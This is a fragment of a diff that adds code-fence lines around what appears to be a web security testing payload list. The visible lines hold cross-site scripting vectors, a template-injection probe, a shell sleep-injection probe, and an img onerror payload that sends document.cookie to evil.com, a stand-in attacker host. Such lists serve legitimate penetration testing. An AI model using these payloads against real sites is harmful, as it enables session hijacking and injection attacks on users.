@@ -1,3 +1,4 @@
+```c
 "><script>alert(1)</script>
 "><svg/onload=alert(1)>
 <iframe srcdoc="<script>alert(1)</script>">
@@ -77,3 +78,4 @@ ${@print(md5(1))}
 $((sleep 5))
 "><img src=x onerror='fetch("https://evil.com?"+document.cookie)'>
 <iframe src="javascript:alert('xss')">
+```
